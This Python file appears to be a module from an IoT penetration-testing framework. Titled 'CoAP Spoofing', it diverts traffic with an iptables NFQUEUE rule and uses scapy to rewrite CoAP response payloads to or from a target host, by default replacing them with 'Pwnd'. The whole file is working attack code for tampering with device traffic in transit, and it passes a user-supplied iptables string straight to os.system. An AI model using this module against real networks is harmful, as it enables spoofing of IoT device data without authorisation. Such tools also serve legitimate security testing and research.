from termcolor import colored, cprint
from module import Module

import threading
import time

from printib import print_error, print_info, print_ok
from scapy.all import *

from netfilterqueue import NetfilterQueue
import os

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "CoAP Spoofing",
                       "Description": "Modify packets of CoAP protocol",
                       "Author": "Marcos Rivera (@marcos_98_rm)"}

        # -----------name-----default_value--description--required?
        # -----------name-----default_value--description--required?
        options = {
            "rhost": ["10.0.2.15", "rhost", True],
            "payload": ["Pwnd", "payload", True],
            "verbose": ["False", "verbose", False],
            "background": ["False", "Execute it in background or foreground", False],
            "iptables": ["iptables -I INPUT -j NFQUEUE", "iptables command to intercept the traffic", True],
        }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._option_name = None
        self.client = None

    
    # This module must be always implemented, it is called by the run option
    def run_module(self):
        rhost = self.options.get("rhost")[0]
        payload = self.options.get("payload")[0]
        verbose = self.options.get("verbose")[0]
        if verbose is not None:
            verbose = verbose.lower() == "true"
        background = self.options.get("background")[0]
        if background is not None:
            background = background.lower() == "true"
        iptables = self.options.get("iptables")[0]

        def go(verbose, iptables):

            def setting_load(packet, new_load):
                load = packet[Raw].load
                to_bytes = new_load.encode()

                if len(load) > 7 and packet[Raw].load[6] == 255:
                    packet[Raw].load = load[0:7] + to_bytes
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[UDP].chksum
                    del packet[UDP].len
                    
                return packet
                

            def modify(packet):
                pkt = IP(packet.get_payload())

                if pkt.haslayer(UDP) and pkt.haslayer(Raw) and (pkt[IP].src == rhost or pkt[IP].dst == rhost):
                    if pkt[UDP].sport == 5683:
                        modified = setting_load(pkt, payload)
                        packet.set_payload(bytes(modified))

                        if verbose:
                            print_ok("Packet modified")
                        
                packet.accept()


            try:
                os.system(iptables)
                queue = NetfilterQueue()
                queue.bind(0, modify)
                queue.run()
            except KeyboardInterrupt:
                os.system(iptables.replace("-I", "-D"))
                print_ok("\n[+] Detected CTL+C exiting program")
                print("")

        if not background:
            go(verbose, iptables)
        else:
            thread1 = threading.Thread(target=go, args=[verbose, iptables])
            thread1.start()
        
            super(CustomModule, self).run(t=thread1)

        